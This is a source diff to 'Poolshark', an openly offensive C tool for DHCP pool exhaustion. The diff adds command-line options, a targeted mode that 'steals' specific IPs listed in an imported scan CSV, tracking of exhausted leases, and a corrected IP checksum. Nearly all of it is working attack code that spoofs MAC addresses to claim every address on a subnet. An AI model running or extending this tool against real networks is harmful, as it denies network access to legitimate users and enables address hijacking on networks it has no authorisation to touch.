@@ -16,6 +16,7 @@
 #include <stdbool.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
+#include <getopt.h>
 
 #define BUFFER_SIZE 65535
 
@@ -80,18 +81,81 @@ typedef struct Packet
     DHCP dhcp;
 } __attribute__((packed)) Packet;
 
+typedef struct Exausted
+{
+    uint8_t ip[4];
+    uint8_t mac[16];
+    uint32_t lease_time;
+    struct Exausted *next;
+} Exausted;
+
+void print_usage(const char *progname);
 void spoof_mac(uint8_t *mac);
 void rand_transaction_id(uint8_t *id);
 void calc_ip_checksum(Packet *p);
 int netmask_to_cidr(unsigned long netmask);
-void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay);
+void exaust_pool(int sock, int ifindex, Packet *p, Exausted *e, int num, int delay, const char *hostname);
 
-int main(void)
+int main(int argc, char *argv[])
 {
+    char *iface = NULL;
+    char *import_file = NULL;
+    int opt;
+    int delay = 0;
+    FILE *fp = NULL;
+    Exausted *head = NULL;
+    const char *hostname = "pwn3d-poolshark";
+
+    if(getuid() != 0)
+    {
+        printf("Error: Poolshark requires root priveledges\n");
+        printf("Try: sudo %s -i <interface>\n", argv[0]);
+        return 1;
+    }
+
+    while((opt = getopt(argc, argv, "i:d:f:n:h")) != -1)
+    {
+        switch (opt)
+        {
+            case 'i':
+                iface = optarg;
+                break;
+            case 'h':
+                print_usage(argv[0]);
+                exit(EXIT_SUCCESS);
+            case 'd':
+                delay = atoi(optarg);
+                break;
+            case 'f':
+                import_file = optarg;
+                break;
+            case 'n':
+                hostname = optarg;
+                break;
+        }
+    }
+
+    if(!iface)
+    {
+        printf("Error: Interface is required\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if(import_file)
+    {
+        fp = fopen(import_file, "r");
+        if(!fp)
+        {
+            perror("fopen");
+            return 1;
+        }
+    }
+
     Packet *p = malloc(sizeof(Packet));
+    
+
     struct ifreq ifr;
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    char *iface = "enp34s0";
 
     if(!p)
     {
@@ -186,7 +250,7 @@ int main(void)
     printf("identified %d ip's to exause on subnet...\n", num_of_ips);
     printf("starting attack...\n");
     
-    exaust_pool(sock, ifindex, p, num_of_ips, 0);
+    exaust_pool(sock, ifindex, p, head, num_of_ips, 0, hostname);
 }
 
 void spoof_mac(uint8_t *mac)
@@ -213,11 +277,13 @@ void calc_ip_checksum(Packet *p)
     p->ip.checksum = 0;
 
     uint32_t sum = 0;
-    uint16_t *words = (uint16_t *)&p->ip;
-
-    for(int i = 0; i < 10; i++)
+    uint16_t word;
+    int ip_header_len = sizeof(p->ip);
+    
+    for(int i = 0; i < ip_header_len / 2; i++)
     {
-        sum += ntohs(words[i]);
+        memcpy(&word, (uint8_t *)&p->ip + (i * 2), sizeof(uint16_t));
+        sum += ntohs(word);
     }
 
     while(sum >> 16)
@@ -242,15 +308,15 @@ int netmask_to_cidr(unsigned long netmask)
 }
 
 
-void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay)
+void exaust_pool(int sock, int ifindex, Packet *p, Exausted *head, int num, int delay, const char *hostname)
 {
     unsigned char buffer[BUFFER_SIZE];
     char random_mac[18];
     char host[16];
     char offered_ip[16];
-    char *hostname = "pwn3d-poolshark";
     int len = strlen(hostname);
     int offset = 0;
+    int count = 0;
     bool success = false;
 
     for(int i = 0; i < num; i++)
@@ -326,8 +392,8 @@ void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay)
             response_packet->dhcp.ip_addr[3]
             );
 
-            printf("[%s] offered [%s] for [%s]", host, offered_ip, random_mac);
-            fflush(stdout);
+            //printf("[%s] offered [%s] for [%s]", host, offered_ip, random_mac);
+            //fflush(stdout);
 
             offset = 0;
 
@@ -384,10 +450,56 @@ void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay)
                     continue;
                 }
 
-                printf(" - [SUCCESS]\n");
+                //printf(" - [SUCCESS]\n");
+
+
+                Exausted *new_node = malloc(sizeof(Exausted));
+                if(!new_node)
+                {
+                    perror("malloc");
+                    return;
+                }
+                count++;
+                printf("\033[2J\033[H");  // ANSI: clear screen + move cursor to home
+                fflush(stdout);
+                printf("Exausted %d/%d IP's\n", count, num);
+                
+
+                memcpy(&new_node->ip, &response_packet->dhcp.ip_addr, sizeof(response_packet->dhcp.ip_addr));
+                memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
+                new_node->lease_time = 7200;
+                new_node->next = head;
+                head = new_node;
                 break;
             }
             break;
         } 
     }
+}
+
+void print_usage(const char *progname)
+{
+    printf("Poolshark - DHCP Pool Exaustion Tool\n\n");
+    printf("Usage: sudo %s -i <interface> [-d][-f][-n][-h]\n", progname);
+    printf("\n");
+    printf("Required:\n");
+    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
+    printf("\n");
+    printf("Options:\n");
+    printf(" -d <delay>      Delay between requests in milliseconds (default: 0)\n");
+    printf(" -f <file>       Import Cardshark CSV to steal specific IPs first\n");
+    printf(" -n <hostname>   Custom hostname for DHCP requests (default: pwn3d-poolshark)\n");
+    printf(" -h              Display this help message\n");
+    printf("\n");
+    printf("Examples:\n");
+    printf(" sudo %s -i eth0\n", progname);
+    printf(" sudo %s -i wlan0 -d 1000\n", progname);
+    printf(" sudo %s -i eth0 -f cardshark_scan.csv\n", progname);
+    printf(" sudo %s -i eth0 -n h4ck3ed -d 500\n", progname);
+    printf("\n");
+    printf("Attack Modes:\n");
+    printf(" Normal:   Exhausts entire DHCP pool with random MAC addresses\n");
+    printf(" Targeted: Uses -f to steal specific IPs first, then exhausts remainder\n");
+    printf("\n");
+    printf("Press Ctrl+C to stop exaust attack.\n");
 }
